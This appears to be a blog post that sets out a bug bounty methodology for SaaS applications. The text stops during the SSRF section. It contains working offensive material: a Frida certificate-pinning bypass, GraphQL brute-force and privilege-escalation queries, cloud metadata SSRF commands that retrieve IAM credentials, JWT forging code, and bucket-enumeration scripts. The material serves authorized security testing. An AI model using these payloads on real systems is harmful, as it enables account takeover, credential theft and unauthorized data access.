# Bug Bounty Methodology for Modern SaaS Applications

*A systematic, tool-driven approach to hunting vulnerabilities in modern SaaS platforms -- from passive recon to final report submission.*

**Meta Description:** Master the complete bug bounty methodology for modern SaaS applications. Covers recon pipelines, Burp Suite workflows, GraphQL testing, cloud enumeration, mobile API testing, Nuclei automation, and professional reporting techniques used by top-earning hunters.

**Slug:** bug-bounty-methodology-modern-saas-applications

**Keywords:** bug bounty methodology, SaaS penetration testing, recon pipeline, subdomain enumeration, Burp Suite workflow, GraphQL hacking, cloud recon, bug bounty reporting, nuclei templates, mobile API testing, S3 bucket enumeration, CVSS scoring, bug bounty automation

---

## Introduction

Most bug bounty hunters plateau because they treat hunting like a lottery -- fire up Burp, click around, hope for a reflected XSS. That approach stopped working in 2022. Modern SaaS applications deploy behind CDNs, use GraphQL, split functionality across dozens of microservices, store assets in cloud buckets, and serve mobile clients through separate API gateways.

Earning consistently on HackerOne, Bugcrowd, or Intigriti requires a methodology -- a repeatable system that maximizes coverage, minimizes duplicates, and surfaces the high-severity bugs that pay $5,000-$50,000.

This post documents the complete methodology I use against modern SaaS targets. Every tool, every command, every decision point. No theory-only sections -- everything here has produced real bounties.

---

## 1. Program Selection Strategy

Before you touch a single tool, choosing the right program determines your ROI more than any technical skill.

### Selection Criteria Matrix

```
Program Score = (Scope Breadth * 3) + (Payout Ratio * 2) + (Response Time * 2) + (Age Factor * 1)

Scope Breadth:
  *.target.com = 5 points
  Specific list of 5+ domains = 3 points
  Single domain = 1 point

Payout Ratio:
  Critical > $10k = 5 points
  Critical > $5k  = 3 points
  Critical > $1k  = 1 point

Response Time (from program stats):
  Avg < 24h = 5 points
  Avg < 72h = 3 points
  Avg > 1 week = 1 point

Age Factor:
  Launched < 3 months ago = 5 points (less picked over)
  3-12 months = 3 points
  > 1 year = 1 point (but may have deeper bugs remaining)
```

### Where to Find New Programs

```bash
# Monitor new programs on HackerOne
curl -s "https://hackerone.com/programs/search?query=type:hackerone&sort=launched_at:descending" \
  | jq '.results[] | {name: .name, launched: .launched_at, bounty_range: .meta.min_bounty + "-" + .meta.max_bounty}'

# Bugcrowd new programs (check weekly)
# https://bugcrowd.com/programs?sort[]=promoted-desc&page=1

# Monitor Twitter/X for private invite announcements
# Follow: @Bugcrowd, @Haborone, @inaborone, @synack
```

### The "Fresh Eyes" Strategy

Target programs that just expanded scope. When a SaaS company adds a new subdomain, acquires a company, or launches a new product line, that new attack surface has had zero bounty hunter attention. Set up monitoring:

```bash
#!/bin/bash
# monitor_scope_changes.sh
# Checks HackerOne program scope for changes

PROGRAM="target-program"
SCOPE_FILE="$HOME/.bounty/scopes/${PROGRAM}.txt"

# Fetch current scope
curl -s "https://hackerone.com/${PROGRAM}" \
  | grep -oP 'https?://[a-zA-Z0-9.*-]+\.[a-zA-Z]{2,}' \
  | sort -u > /tmp/current_scope.txt

# Compare with stored scope
if [ -f "$SCOPE_FILE" ]; then
  NEW_ASSETS=$(comm -13 "$SCOPE_FILE" /tmp/current_scope.txt)
  if [ -n "$NEW_ASSETS" ]; then
    echo "[!] NEW SCOPE ASSETS for $PROGRAM:"
    echo "$NEW_ASSETS"
    # Send notification
    notify-send "Bug Bounty" "New scope for $PROGRAM: $NEW_ASSETS"
  fi
fi

cp /tmp/current_scope.txt "$SCOPE_FILE"
```

---

## 2. Complete Recon Workflow

Recon is not a phase -- it is the foundation. I split recon into passive (no direct target interaction) and active (direct interaction), always running passive first to build a complete map before making noise.

### 2.1 Passive Reconnaissance

#### Subdomain Enumeration

Layer multiple tools because no single tool finds everything:

```bash
#!/bin/bash
# recon_subdomains.sh
TARGET="target.com"
OUTPUT_DIR="$HOME/.bounty/recon/$TARGET"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting subdomain enumeration for $TARGET"

# 1. Subfinder -- queries 40+ passive sources
subfinder -d "$TARGET" -all -recursive -o "$OUTPUT_DIR/subfinder.txt" -silent
echo "[+] Subfinder: $(wc -l < $OUTPUT_DIR/subfinder.txt) subdomains"

# 2. Amass passive mode -- broader source coverage
amass enum -passive -d "$TARGET" -o "$OUTPUT_DIR/amass.txt" 2>/dev/null
echo "[+] Amass: $(wc -l < $OUTPUT_DIR/amass.txt) subdomains"

# 3. crt.sh -- Certificate Transparency logs
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" \
  | jq -r '.[].name_value' \
  | sed 's/\*\.//g' \
  | sort -u > "$OUTPUT_DIR/crtsh.txt"
echo "[+] crt.sh: $(wc -l < $OUTPUT_DIR/crtsh.txt) subdomains"

# 4. SecurityTrails API
curl -s "https://api.securitytrails.com/v1/domain/$TARGET/subdomains" \
  -H "APIKEY: $SECURITYTRAILS_KEY" \
  | jq -r '.subdomains[]' \
  | sed "s/$/.${TARGET}/" > "$OUTPUT_DIR/securitytrails.txt"
echo "[+] SecurityTrails: $(wc -l < $OUTPUT_DIR/securitytrails.txt) subdomains"

# 5. GitHub dorking for subdomains
# Search: "target.com" site:github.com
github-subdomains -d "$TARGET" -t "$GITHUB_TOKEN" -o "$OUTPUT_DIR/github.txt" 2>/dev/null

# 6. Shodan
shodan search "hostname:$TARGET" --fields hostnames \
  | tr ',' '\n' \
  | grep "$TARGET" \
  | sort -u > "$OUTPUT_DIR/shodan.txt"

# Merge and deduplicate
cat "$OUTPUT_DIR"/*.txt | sort -u > "$OUTPUT_DIR/all_subdomains.txt"
echo "[+] Total unique subdomains: $(wc -l < $OUTPUT_DIR/all_subdomains.txt)"
```

#### DNS Resolution and Alive Check

Raw subdomains are useless without resolution:

```bash
# Resolve all subdomains and check which are alive
cat "$OUTPUT_DIR/all_subdomains.txt" | dnsx -silent -a -resp -o "$OUTPUT_DIR/resolved.txt"

# HTTP probe -- find web servers
cat "$OUTPUT_DIR/all_subdomains.txt" \
  | httpx -silent -status-code -title -tech-detect -follow-redirects \
  -o "$OUTPUT_DIR/httpx_results.txt"

# Extract just the alive URLs
cat "$OUTPUT_DIR/httpx_results.txt" | awk '{print $1}' > "$OUTPUT_DIR/alive_urls.txt"
echo "[+] Alive web servers: $(wc -l < $OUTPUT_DIR/alive_urls.txt)"
```

#### Endpoint Discovery

Historical data reveals endpoints developers forgot to decommission:

```bash
# Wayback Machine URLs
echo "$TARGET" | waybackurls | sort -u > "$OUTPUT_DIR/wayback.txt"

# GAU (GetAllUrls) -- Wayback + Common Crawl + OTX + URLScan
echo "$TARGET" | gau --threads 5 --o "$OUTPUT_DIR/gau.txt"

# Katana -- modern crawling with headless browser
katana -list "$OUTPUT_DIR/alive_urls.txt" \
  -d 3 \
  -js-crawl \
  -known-files all \
  -output "$OUTPUT_DIR/katana.txt"

# Merge endpoint lists
cat "$OUTPUT_DIR/wayback.txt" "$OUTPUT_DIR/gau.txt" "$OUTPUT_DIR/katana.txt" \
  | sort -u \
  | grep -v '\.woff\|\.css\|\.png\|\.jpg\|\.gif\|\.svg\|\.ico' \
  > "$OUTPUT_DIR/all_endpoints.txt"

echo "[+] Total endpoints: $(wc -l < $OUTPUT_DIR/all_endpoints.txt)"
```

#### JavaScript File Analysis

JS files are the single richest source of hidden endpoints, API keys, and internal logic:

```bash
# Extract JS file URLs
cat "$OUTPUT_DIR/all_endpoints.txt" | grep '\.js$' | sort -u > "$OUTPUT_DIR/js_files.txt"

# Download all JS files
mkdir -p "$OUTPUT_DIR/js_downloads"
cat "$OUTPUT_DIR/js_files.txt" | while read url; do
  filename=$(echo "$url" | md5sum | cut -d' ' -f1).js
  curl -s "$url" -o "$OUTPUT_DIR/js_downloads/$filename"
done

# Extract endpoints from JS files using LinkFinder
python3 linkfinder.py -i "$OUTPUT_DIR/js_downloads/" -d -o "$OUTPUT_DIR/js_endpoints.txt"

# Search for secrets in JS files
nuclei -l "$OUTPUT_DIR/js_files.txt" -t exposures/tokens/ -silent -o "$OUTPUT_DIR/js_secrets.txt"

# Manual regex for API keys
grep -rhoP '(?:api[_-]?key|apikey|api_secret|access_token|auth_token|client_secret)[\s]*[:=][\s]*["\x27]([a-zA-Z0-9_\-]{20,})' \
  "$OUTPUT_DIR/js_downloads/" > "$OUTPUT_DIR/potential_keys.txt"

# Search for internal API paths
grep -rhoP '(/api/v[0-9]+/[a-zA-Z0-9/_-]+)' "$OUTPUT_DIR/js_downloads/" \
  | sort -u > "$OUTPUT_DIR/api_paths.txt"
```

### 2.2 Technology Fingerprinting

Knowing the stack tells you what vulnerabilities to test for:

```bash
# Wappalyzer CLI
wappalyzer https://app.target.com --pretty

# Check HTTP headers for tech leaks
curl -sI https://app.target.com | grep -iE 'server:|x-powered|x-aspnet|x-framework|x-generator'

# Nuclei tech detection
nuclei -u https://app.target.com -t technologies/ -silent

# Typical findings and what they mean:
# X-Powered-By: Express    --> Node.js, test for prototype pollution, NoSQL injection
# Server: nginx/1.19       --> Check for misconfigs, path traversal via off-by-slash
# X-Framework: Next.js     --> Check _next/data/, API routes, SSR injection
# Set-Cookie: JSESSIONID   --> Java backend, test deserialization, SSTI (Freemarker/Thymeleaf)
# X-Request-Id: uuid       --> Microservice architecture, test for SSRF between services
```

### 2.3 Active Reconnaissance

#### Port Scanning

```bash
# Fast port scan with Naabu
naabu -list "$OUTPUT_DIR/all_subdomains.txt" \
  -top-ports 1000 \
  -silent \
  -o "$OUTPUT_DIR/open_ports.txt"

# Follow up interesting ports with Nmap
nmap -sV -sC -p 8080,8443,9090,3000,5000,8000 \
  -iL "$OUTPUT_DIR/resolved_ips.txt" \
  -oN "$OUTPUT_DIR/nmap_services.txt"
```

#### Directory Bruteforcing

```bash
# Feroxbuster for recursive directory discovery
feroxbuster -u https://app.target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,asp,aspx,jsp,json,js \
  -t 50 \
  --smart \
  --auto-tune \
  -o "$OUTPUT_DIR/feroxbuster.txt"

# Target API specifically
feroxbuster -u https://api.target.com \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -m GET,POST \
  -t 30 \
  -o "$OUTPUT_DIR/api_brute.txt"
```

---

## 3. Burp Suite Complete Workflow

Burp Suite is the core of manual testing. A disciplined workflow prevents wasted time.

### 3.1 Scope Configuration

```
Target > Scope Settings > Add:

Include in scope:
  Protocol: Any
  Host: .*\.target\.com$
  Port: Any
  File: Any

Exclude from scope:
  *.google.com
  *.googleapis.com
  *.gstatic.com
  *.cloudflare.com
  *.sentry.io
  *.segment.com
  *.analytics.*
```

Set Proxy > Options > Intercept Client Requests > "Is in target scope" to avoid drowning in noise.

### 3.2 Crawling and Discovery

```
1. Browse every feature manually with Burp proxy active
   - Register an account at every privilege level (free, trial, admin if possible)
   - Click every button, submit every form, trigger every AJAX call
   - This manual crawl builds the site map organically

2. Run Burp's active crawler second
   Target > Site map > Right-click target > Scan > Crawl only
   - Set crawl depth to 8
   - Set max crawl time to 30 minutes

3. Review site map for hidden gems
   - Sort by MIME type to find JSON/XML endpoints
   - Look for endpoints with numeric IDs (IDOR candidates)
   - Look for file upload endpoints
   - Look for redirect parameters (open redirect)
   - Check for /admin, /internal, /debug, /graphql paths
```

### 3.3 Active Scanning Strategy

Do not scan the entire domain at once. Target specific insertion points:

```
For each interesting request:
  Right-click > Scan > Active scan

  Scan configuration:
    - Audit optimization: "Thorough"
    - Issues: Select specific issue types relevant to the endpoint
      - Parameter-based endpoints: SQLi, XSS, SSTI, command injection
      - File upload: Upload-based issues
      - Authentication: Auth bypass, session management
      - Headers: Host header injection, request smuggling

  Custom insertion points (Extensions > Param Miner):
    - Automatically find hidden parameters
    - Test headers for cache poisoning
    - Discover undocumented query parameters
```

### 3.4 Essential Burp Extensions

```
Must-have extensions:
  1. Param Miner        -- discovers hidden parameters and headers
  2. Logger++           -- advanced request/response logging with filters
  3. Autorize           -- automatic IDOR and privilege escalation testing
  4. JSON Web Tokens    -- decode, edit, and attack JWTs inline
  5. Active Scan++      -- additional active scan checks
  6. Turbo Intruder     -- race condition and high-speed fuzzing
  7. Backslash Powered Scanner -- finds differential server behavior
  8. Upload Scanner     -- tests file upload vulnerabilities
  9. GraphQL Raider     -- GraphQL introspection and query manipulation
  10. Collaborator Everywhere -- inserts Collaborator payloads in all headers
```

### 3.5 Autorize for Privilege Escalation Testing

This is the single most effective Burp extension for IDOR and broken access control:

```
Setup:
1. Log in as User A (admin/higher-privilege) -- this is your main browser session
2. Log in as User B (regular/lower-privilege) -- copy their session cookie
3. In Autorize tab:
   - Paste User B's cookie in the "Cookie" field
   - Add authorization headers if needed (e.g., Bearer token)
   - Click "Autorize is ON"

4. Browse the application as User A
   - Autorize replays every request with User B's cookies
   - Green = User B gets the same response (BROKEN ACCESS CONTROL)
   - Red = User B is denied (CORRECT behavior)
   - Orange = Different response (needs manual review)

Focus areas:
  - Admin endpoints returning green = vertical privilege escalation
  - Other user's resource endpoints returning green = horizontal IDOR
  - User A's profile/settings returning green = data leak
```

---

## 4. Mobile API Testing Methodology

Most SaaS applications have mobile apps with separate (often less hardened) API endpoints.

### 4.1 Proxy Setup

```bash
# Android emulator with Burp proxy
# 1. Start emulator
emulator -avd Pixel_6_API_33 -http-proxy 127.0.0.1:8080

# 2. Install Burp CA certificate
# Export Burp CA: Proxy > Options > Import/Export CA Certificate > DER format
# Convert to PEM
openssl x509 -inform DER -in burp-ca.der -out burp-ca.pem

# For Android 7+ (system CA required)
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp-ca.pem | head -1)
cp burp-ca.pem "${HASH}.0"
adb root
adb remount
adb push "${HASH}.0" /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/"${HASH}.0"
adb reboot
```

### 4.2 Certificate Pinning Bypass

Modern apps pin certificates. Bypass with Frida:

```javascript
// frida_ssl_bypass.js
// Universal SSL pinning bypass for Android

Java.perform(function() {
    // Bypass OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function(hostname, peerCertificates) {
            console.log('[+] OkHttp3 pinning bypassed for: ' + hostname);
            return;
        };
    } catch(e) {
        console.log('[-] OkHttp3 not found');
    }

    // Bypass TrustManagerImpl
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(
            untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData
        ) {
            console.log('[+] TrustManagerImpl bypassed for: ' + host);
            return untrustedChain;
        };
    } catch(e) {
        console.log('[-] TrustManagerImpl not found');
    }

    // Bypass Flutter/Dart SSL
    try {
        var module = Process.findModuleByName("libflutter.so");
        if (module) {
            // Pattern for ssl_crypto_x509_session_verify_cert_chain
            var pattern = "2d e9 f0 4f a3 b0 81 46 50 20 10 70";
            Memory.scan(module.base, module.size, pattern, {
                onMatch: function(address, size) {
                    console.log('[+] Flutter SSL bypass at: ' + address);
                    Interceptor.attach(address, {
                        onLeave: function(retval) { retval.replace(0x1); }
                    });
                }
            });
        }
    } catch(e) {
        console.log('[-] Flutter not found');
    }
});
```

```bash
# Run Frida bypass
frida -U -f com.target.app -l frida_ssl_bypass.js --no-pause
```

### 4.3 Mobile API Differences

Mobile APIs often expose more than web APIs:

```
Common findings in mobile APIs:
  1. Older API versions still active: /api/v1/ has bugs fixed in /api/v3/
  2. Debug endpoints left in production: /api/debug/users, /api/internal/config
  3. Weaker rate limiting (mobile expected to make fewer requests)
  4. Different serialization (Protobuf/MessagePack) with looser validation
  5. GraphQL subscriptions open without auth
  6. Push notification token leaks
  7. Device registration endpoints with mass assignment
```

```http
POST /api/v1/device/register HTTP/1.1
Host: mobile-api.target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "device_id": "abc123",
  "platform": "android",
  "push_token": "fcm_token_here",
  "role": "admin",
  "is_staff": true,
  "subscription_tier": "enterprise"
}
```

The extra fields `role`, `is_staff`, and `subscription_tier` are mass assignment attempts. Mobile endpoints frequently accept these because developers copy the same model schema without filtering.

---

## 5. GraphQL Endpoint Discovery and Testing

GraphQL is everywhere in modern SaaS. It consolidates attack surface into a single endpoint, and developers frequently misconfigure it.

### 5.1 Finding GraphQL Endpoints

```bash
# Common GraphQL paths
PATHS=(
  "/graphql"
  "/graphiql"
  "/v1/graphql"
  "/api/graphql"
  "/query"
  "/gql"
  "/graphql/console"
  "/v1/explorer"
  "/altair"
  "/playground"
)

for path in "${PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://app.target.com${path}")
  if [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ]; then
    echo "[+] GraphQL endpoint found: https://app.target.com${path} (HTTP $STATUS)"
  fi
done

# Check for GraphQL in JS bundles
grep -rhoP '(graphql|/gql|query\s*\{|mutation\s*\{)' "$OUTPUT_DIR/js_downloads/" | sort -u
```

### 5.2 Introspection Query

```http
POST /graphql HTTP/1.1
Host: api.target.com
Content-Type: application/json
Authorization: Bearer <token>

{
  "query": "{ __schema { types { name fields { name type { name kind ofType { name } } args { name type { name } } } } } }"
}
```

If introspection is disabled, use field suggestion exploitation:

```http
POST /graphql HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
  "query": "{ usre { id } }"
}
```

Response with suggestions:

```json
{
  "errors": [{
    "message": "Cannot query field 'usre' on type 'Query'. Did you mean 'user', 'users', 'userByEmail'?"
  }]
}
```

Automate this with `clairvoyance`:

```bash
# Reconstruct schema without introspection
python3 clairvoyance.py -u https://api.target.com/graphql \
  -w /usr/share/seclists/Discovery/Web-Content/graphql-field-names.txt \
  -o schema.json
```

### 5.3 GraphQL Attack Patterns

```graphql
# IDOR via direct object reference
query {
  user(id: "other-users-uuid") {
    email
    ssn
    paymentMethods {
      cardNumber
      expiry
    }
  }
}

# Nested query DoS (Query Depth Attack)
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              id
              email
            }
          }
        }
      }
    }
  }
}

# Batching attack (bypass rate limiting)
[
  { "query": "mutation { login(email: \"admin@target.com\", password: \"password1\") { token } }" },
  { "query": "mutation { login(email: \"admin@target.com\", password: \"password2\") { token } }" },
  { "query": "mutation { login(email: \"admin@target.com\", password: \"password3\") { token } }" },
  { "query": "mutation { login(email: \"admin@target.com\", password: \"password4\") { token } }" },
  { "query": "mutation { login(email: \"admin@target.com\", password: \"password5\") { token } }" }
]

# Alias-based batching (single request, multiple operations)
query {
  attempt1: login(email: "admin@target.com", password: "pass1") { token }
  attempt2: login(email: "admin@target.com", password: "pass2") { token }
  attempt3: login(email: "admin@target.com", password: "pass3") { token }
  attempt4: login(email: "admin@target.com", password: "pass4") { token }
  attempt5: login(email: "admin@target.com", password: "pass5") { token }
}

# Mutation for privilege escalation
mutation {
  updateUser(input: {
    id: "my-user-id"
    role: "ADMIN"
    permissions: ["READ", "WRITE", "DELETE", "ADMIN"]
  }) {
    id
    role
  }
}
```

---

## 6. Cloud Recon

Modern SaaS runs on cloud infrastructure. Misconfigured cloud storage is a reliable source of high-severity findings.

### 6.1 S3 Bucket Enumeration

```bash
# Generate bucket name permutations
TARGET="targetcompany"
PERMS=(
  "$TARGET"
  "${TARGET}-backup"
  "${TARGET}-backups"
  "${TARGET}-dev"
  "${TARGET}-staging"
  "${TARGET}-prod"
  "${TARGET}-production"
  "${TARGET}-assets"
  "${TARGET}-uploads"
  "${TARGET}-static"
  "${TARGET}-media"
  "${TARGET}-data"
  "${TARGET}-logs"
  "${TARGET}-db-backup"
  "${TARGET}-internal"
  "${TARGET}-private"
  "${TARGET}.com"
  "backup.${TARGET}.com"
  "${TARGET}-cdn"
  "${TARGET}-public"
)

for bucket in "${PERMS[@]}"; do
  STATUS=$(aws s3 ls "s3://$bucket" 2>&1)
  if [[ ! "$STATUS" == *"NoSuchBucket"* ]] && [[ ! "$STATUS" == *"AccessDenied"* ]]; then
    echo "[OPEN] s3://$bucket"
    echo "$STATUS" | head -20
  elif [[ "$STATUS" == *"AccessDenied"* ]]; then
    echo "[EXISTS] s3://$bucket (Access Denied -- try authenticated access)"
  fi
done
```

```bash
# Check for bucket policy misconfiguration
aws s3api get-bucket-policy --bucket targetcompany-uploads 2>/dev/null | jq .

# Check for public ACL
aws s3api get-bucket-acl --bucket targetcompany-uploads 2>/dev/null | jq .

# Try to upload (write access test)
echo "bugbounty-test" > /tmp/bb-test.txt
aws s3 cp /tmp/bb-test.txt s3://targetcompany-uploads/bb-test.txt 2>&1
# IMPORTANT: If successful, immediately delete and report. Never upload malicious content.
aws s3 rm s3://targetcompany-uploads/bb-test.txt 2>/dev/null
```

### 6.2 Azure Blob Storage

```bash
# Azure blob enumeration
ACCOUNT="targetcompany"
CONTAINERS=("$web" "uploads" "backups" "data" "assets" "media" "public" "private" "logs")

for container in "${CONTAINERS[@]}"; do
  URL="https://${ACCOUNT}.blob.core.windows.net/${container}?restype=container&comp=list"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
  if [ "$STATUS" = "200" ]; then
    echo "[OPEN] $URL"
    curl -s "$URL" | xmllint --format - | head -50
  fi
done
```

### 6.3 GCP Storage

```bash
# GCP bucket enumeration
for bucket in "${PERMS[@]}"; do
  URL="https://storage.googleapis.com/$bucket"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
  if [ "$STATUS" = "200" ]; then
    echo "[OPEN] $URL"
    curl -s "$URL" | head -50
  elif [ "$STATUS" = "403" ]; then
    echo "[EXISTS] $URL (Forbidden -- try authenticated)"
  fi
done
```

### 6.4 Cloud Metadata SSRF

If you find an SSRF vulnerability, cloud metadata endpoints are the highest-value targets:

```bash
# AWS IMDSv1 (if target hasn't enforced IMDSv2)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2 (requires token)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## 7. Automation with Custom Scripts and Nuclei

### 7.1 Nuclei Templates for Custom Checks

```yaml
# nuclei-templates/custom/sensitive-debug-endpoints.yaml
id: sensitive-debug-endpoints

info:
  name: Sensitive Debug Endpoints
  author: your-handle
  severity: high
  description: Checks for exposed debug and internal endpoints

http:
  - method: GET
    path:
      - "{{BaseURL}}/debug/vars"
      - "{{BaseURL}}/debug/pprof/"
      - "{{BaseURL}}/_debug"
      - "{{BaseURL}}/actuator"
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/actuator/heapdump"
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/config.json"
      - "{{BaseURL}}/api/debug"
      - "{{BaseURL}}/api/internal/config"
      - "{{BaseURL}}/server-status"
      - "{{BaseURL}}/server-info"
      - "{{BaseURL}}/__graphql"
      - "{{BaseURL}}/graphiql"
      - "{{BaseURL}}/altair"
      - "{{BaseURL}}/swagger.json"
      - "{{BaseURL}}/openapi.json"
      - "{{BaseURL}}/api-docs"

    stop-at-first-match: false
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "cmdline"
          - "memstats"
          - "swagger"
          - "openapi"
          - "GraphiQL"
          - "graphql"
        condition: or
```

```yaml
# nuclei-templates/custom/jwt-weak-secret.yaml
id: jwt-weak-secret

info:
  name: JWT Weak Secret Detection
  author: your-handle
  severity: high
  description: Tests if JWT tokens use common weak secrets

http:
  - raw:
      - |
        GET /api/user/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_token}}

    extractors:
      - type: regex
        name: jwt
        part: header
        regex:
          - 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
```

```bash
# Run custom templates
nuclei -l "$OUTPUT_DIR/alive_urls.txt" \
  -t ~/nuclei-templates/custom/ \
  -severity high,critical \
  -o "$OUTPUT_DIR/nuclei_custom.txt"

# Run full template suite against targets
nuclei -l "$OUTPUT_DIR/alive_urls.txt" \
  -t cves/ -t exposures/ -t misconfiguration/ -t vulnerabilities/ \
  -severity medium,high,critical \
  -rate-limit 50 \
  -bulk-size 25 \
  -o "$OUTPUT_DIR/nuclei_full.txt"
```

### 7.2 Building a Complete Recon Pipeline

```bash
#!/bin/bash
# recon_pipeline.sh -- Complete automated recon pipeline
# Usage: ./recon_pipeline.sh target.com

set -euo pipefail

TARGET="$1"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BASE_DIR="$HOME/.bounty/recon/${TARGET}/${TIMESTAMP}"
mkdir -p "$BASE_DIR"/{subdomains,endpoints,screenshots,nuclei,ports}

log() { echo "[$(date +%H:%M:%S)] $1"; }

# Phase 1: Subdomain Enumeration
log "Phase 1: Subdomain enumeration"
subfinder -d "$TARGET" -all -o "$BASE_DIR/subdomains/subfinder.txt" -silent &
amass enum -passive -d "$TARGET" -o "$BASE_DIR/subdomains/amass.txt" 2>/dev/null &
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" \
  | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u \
  > "$BASE_DIR/subdomains/crtsh.txt" &
wait

cat "$BASE_DIR/subdomains/"*.txt | sort -u > "$BASE_DIR/subdomains/all.txt"
log "Found $(wc -l < "$BASE_DIR/subdomains/all.txt") unique subdomains"

# Phase 2: HTTP Probing
log "Phase 2: HTTP probing"
httpx -l "$BASE_DIR/subdomains/all.txt" -silent -status-code -title \
  -tech-detect -follow-redirects -o "$BASE_DIR/subdomains/httpx.txt"
cat "$BASE_DIR/subdomains/httpx.txt" | awk '{print $1}' > "$BASE_DIR/subdomains/alive.txt"
log "Found $(wc -l < "$BASE_DIR/subdomains/alive.txt") alive hosts"

# Phase 3: Port Scanning
log "Phase 3: Port scanning"
naabu -list "$BASE_DIR/subdomains/all.txt" -top-ports 1000 -silent \
  -o "$BASE_DIR/ports/open.txt"

# Phase 4: Endpoint Discovery
log "Phase 4: Endpoint discovery"
cat "$BASE_DIR/subdomains/alive.txt" | while read url; do
  echo "${url#https://}" | waybackurls
done | sort -u > "$BASE_DIR/endpoints/wayback.txt" &

katana -list "$BASE_DIR/subdomains/alive.txt" -d 3 -js-crawl \
  -o "$BASE_DIR/endpoints/katana.txt" 2>/dev/null &
wait

cat "$BASE_DIR/endpoints/"*.txt | sort -u > "$BASE_DIR/endpoints/all.txt"
log "Found $(wc -l < "$BASE_DIR/endpoints/all.txt") unique endpoints"

# Phase 5: Screenshots
log "Phase 5: Taking screenshots"
gowitness file -f "$BASE_DIR/subdomains/alive.txt" \
  --screenshot-path "$BASE_DIR/screenshots/"

# Phase 6: Nuclei Scanning
log "Phase 6: Nuclei scanning"
nuclei -l "$BASE_DIR/subdomains/alive.txt" \
  -t cves/ -t exposures/ -t misconfiguration/ -t technologies/ \
  -severity medium,high,critical \
  -rate-limit 100 \
  -o "$BASE_DIR/nuclei/results.txt"

# Phase 7: Summary
log "=== RECON COMPLETE ==="
log "Subdomains: $(wc -l < "$BASE_DIR/subdomains/all.txt")"
log "Alive hosts: $(wc -l < "$BASE_DIR/subdomains/alive.txt")"
log "Endpoints: $(wc -l < "$BASE_DIR/endpoints/all.txt")"
log "Nuclei findings: $(wc -l < "$BASE_DIR/nuclei/results.txt")"
log "Results: $BASE_DIR"
```

---

## 8. Manual Testing Methodology

After recon, prioritize manual testing by vulnerability class. Here is the order I follow, ranked by typical payout and likelihood:

### 8.1 Authentication and Session Management

```http
# Test JWT algorithm confusion (alg: none)
# Original JWT header: {"alg":"RS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}
# Encode header, keep payload, remove signature

GET /api/admin/users HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.
```

```python
# JWT algorithm confusion -- RS256 to HS256
import jwt
import requests

# Fetch the public key (often at /.well-known/jwks.json or /oauth/certs)
resp = requests.get("https://auth.target.com/.well-known/jwks.json")
public_key = resp.json()["keys"][0]

# Convert JWK to PEM
from jwt.algorithms import RSAAlgorithm
pem_key = RSAAlgorithm.from_jwk(public_key)

# Sign with HS256 using the RSA public key as the HMAC secret
forged_token = jwt.encode(
    {"user_id": 1, "role": "admin", "email": "admin@target.com"},
    pem_key,
    algorithm="HS256"
)
print(f"Forged token: {forged_token}")
```

### 8.2 Authorization Testing (IDOR/BOLA)

```http
# Step 1: Get your own resource
GET /api/v2/invoices/INV-2024-1337 HTTP/1.1
Host: api.target.com
Authorization: Bearer <your-token>

# Step 2: Try another user's resource
GET /api/v2/invoices/INV-2024-1338 HTTP/1.1
Host: api.target.com
Authorization: Bearer <your-token>

# Step 3: Try enumeration patterns
GET /api/v2/invoices/INV-2024-0001 HTTP/1.1
Host: api.target.com
Authorization: Bearer <your-token>
```

```http
# BFLA (Broken Function Level Authorization)
# Regular user trying admin endpoints

DELETE /api/v2/users/victim-uuid HTTP/1.1
Host: api.target.com
Authorization: Bearer <regular-user-token>
Content-Type: application/json

PUT /api/v2/users/victim-uuid/role HTTP/1.1
Host: api.target.com
Authorization: Bearer <regular-user-token>
Content-Type: application/json

{
  "role": "admin"
}
```

### 8.3 Server-Side Request Forgery (SSRF)

```http
# Common SSRF entry points in SaaS apps:
# - Webhook URLs
# - PDF generation (URL to PDF)
# - Image/avatar from URL
# - Import from URL
# - Link preview / unfurling

POST /api/webhooks HTTP/1.1
Host: api.target.com
Authorization: Bearer <token>
